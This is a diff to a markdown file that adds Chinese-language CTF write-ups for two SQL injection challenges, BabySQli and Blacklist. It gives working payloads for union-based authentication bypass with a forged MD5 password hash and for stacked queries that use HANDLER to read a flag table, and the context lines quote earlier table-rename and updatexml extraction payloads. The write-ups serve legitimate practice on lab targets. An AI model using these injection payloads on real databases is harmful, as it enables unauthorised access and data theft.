@@ -331,6 +331,70 @@ Payload："1';rename table `words` to `words1`;rename table `1919810931114514` t
    username=1%27or(updatexml(1,concat(0x7e,(select(group_concat((right(password,25))))from(H4rDsq1)),0x7e),1))%23&password=1
 7. 拼接得到flag
 
+# [GXYCTF2019]BabySQli 1
+
+1. 打开burp，随便输入进行抓包
+2. 得到一串编码`MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5` 
+3. 通过测试发现是套加密(二次加密),首先使用base32对此解码,然后用base64解码
+4. 得到一串SQL查询语句`select * from user where username = '$name'`.通过对这段SQL语句的初步判断,可以得出此题的注入点是参数name
+5. `name=1'&pw=123`发现有SQL报错,可以得出此题的注入类型为字符型注入
+6. `name=1' or '1'='1'#&pw=123`尝试万能密码,得到do not hack me!,猜测’or’关键字或’='字符被过滤
+>判断字段数
+
+`name=1'union select 1,2,3#&pw=123`
+
+>判断用户所在列
+
+`name=1'union select 1,'admin',3#&pw=123`通过用户所在列测试,得出了存在用户admin,又得出了admin用户在第二列,也就是username字段那一列.
+
+>查看题目源码,在search.php源代码哪里发现关键代码
+
+```php
+if($arr[1] == "admin"){
+			if(md5($password) == $arr[2]){
+				echo $flag;
+			}
+			else{
+				die("wrong pass!");
+			}
+		}
+```
+
+发现参数password被md5加密,大致就是传进去的值要进行md5值加密
+
+换种方式猜测
+
+username数据表里面的3个字段分别是flag、name、password
+
+猜测只有password字段位NULL
+
+咱们给参数password传入的值是123
+
+那么传进去后，后台就会把123进行md5值加密并存放到password字段当中
+
+当我们使用查询语句的时候
+
+我们pw参数的值会被md5值进行加密
+
+然后再去与之前存入password中的md5值进行比较
+
+如果相同就会输出flag
+
+>爆flag
+
+这里pw参数的值为123456,可以随便传,但是要对传入的那个值进行md5值加密,网上可以随便找一个在线md5加密平台
+
+`name=1'union select 1,'admin','e10adc3949ba59abbe56e057f20f883e'#&pw=123456`,得到flag
+
+# [GYCTF2020]Blacklist 1(Handler)
+
+1. 尝试堆叠注入,`1';show tables;#`
+2. 1';show columns from `FlagHere`;#,发现有flag字段
+3. 1‘;select flag from `FlagHere`;#,发现select被过滤
+4. 1';handler `FlagHere` open as `kay`;handler `kay` read next;#
+5. Handler方法在上面的wp中有提及
+
+
 
 
 
